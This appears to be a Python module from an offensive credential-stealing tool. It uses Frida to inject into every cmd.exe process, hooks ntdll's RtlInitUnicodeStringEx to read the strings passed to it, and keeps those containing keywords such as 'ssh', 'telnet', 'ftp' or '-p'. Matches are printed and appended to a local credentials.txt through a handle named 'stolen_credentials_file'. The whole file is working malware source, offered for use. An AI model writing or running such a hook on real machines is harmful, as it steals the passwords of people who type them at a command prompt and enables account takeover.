from PyHook import wait_for_process, on_credential_submit, log
import frida

hook_process_name = "cmd"


def logger(message):
    log(hook_process_name, message)


def wait_for():
    wait_for_process(["cmd.exe"], hook)


def hook(pid):
    try:
        logger("Trying To Hook Into CMD")
        session = frida.attach(pid)
        logger(f"Hooked CMD With PID {pid}")
        script = session.create_script("""
			var username;
			var password;
			var RtlInitUnicodeStringEx = Module.findExportByName("Ntdll.dll", "RtlInitUnicodeStringEx")			
			Interceptor.attach(RtlInitUnicodeStringEx, {
				onEnter: function (args) 
				{
					password = args[1];
				},
				onLeave: function (result)
				{

					var pass = password.readUtf16String();

					if (pass)
					{
						 send("\\n=============================" + "\\n[+] Intercepted Creds from CMD" +"\\n"+ "Keyword    : " + pass + "\\n=============================");
					}
				}
			});

		""")
        script.on('message', on_credential_submit_cmd)
        script.load()

    except Exception as e:
        logger("Unhandled exception: " + str(e))
        logger("Continuing...")


def on_credential_submit_cmd(message, data):
    targeted_keywords = ["ftp", "telnet", "ssh", "pass", "-p"]

    credential_dump = message["payload"]
    if any(keyword for keyword in targeted_keywords if keyword in credential_dump):

        logger("Parsed credentials submitted to cmd prompt:")
        print(credential_dump)
        with open("credentials.txt", "a") as stolen_credentials_file:
            stolen_credentials_file.write(credential_dump + '\n')
